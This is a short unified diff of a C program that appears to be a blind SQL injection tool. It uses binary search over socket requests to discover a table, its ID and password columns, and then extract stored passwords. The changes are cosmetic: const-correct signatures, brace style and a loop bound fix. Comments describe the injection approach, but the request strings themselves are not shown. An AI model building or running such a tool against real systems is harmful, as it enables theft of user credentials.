@@ -204,7 +204,7 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-typedef bool (*check_func_t)(void *ctx);
+typedef bool (*check_func_t)(const void *ctx);
 
 typedef struct {
     int sockfd;
@@ -226,7 +226,7 @@ typedef struct {
     const char *pwd_col;
 } PwdCtx;
 
-bool check_table(void *ctx) {
+bool check_table(const void *ctx) {
     GeneralCtx *table_ctx = (GeneralCtx *)ctx;
 
     char mal_req[4096];
@@ -251,7 +251,7 @@ bool check_table(void *ctx) {
 // Function 2: Find Column Name (ID or PWD)
 // No Backticks for table_name here! It is a comparison value in WHERE clause.
 // SQL: ... WHERE table_name = 'User Details' ...
-bool check_column(void *ctx) {
+bool check_column(const void *ctx) {
     ColumnCtx *c_ctx = (ColumnCtx*)ctx;
     char mal_req[4096];
 
@@ -275,7 +275,7 @@ bool check_column(void *ctx) {
 
 // Function 3: Extract Password Data
 // Backticks (%%60) ARE used here because we are using the names as Identifiers in FROM/SELECT/WHERE clauses.
-bool check_password(void *ctx) {
+bool check_password(const void *ctx) {
     PwdCtx *d_ctx = (PwdCtx*)ctx;
     char mal_req[4096];
 
@@ -389,15 +389,14 @@ void binary_search(check_func_t check_fn, void *ctx) {
             gen_ctx->guess = url_map[mid];
             if (check_fn(ctx)) {
                 high=mid;
-            }
-            else {
+            } else {
                 low=mid + 1;
             }
         #ifdef __MY_DEBUG__
             printf("\t%s,%c,%c\n", gen_ctx->discovered, low + 0x20, high + 0x20);
         #endif
         }
-        if (low>0x5f) {
+        if (low>=0x5f) {
             break;
         }
         strcat(gen_ctx->discovered, url_map[low]);
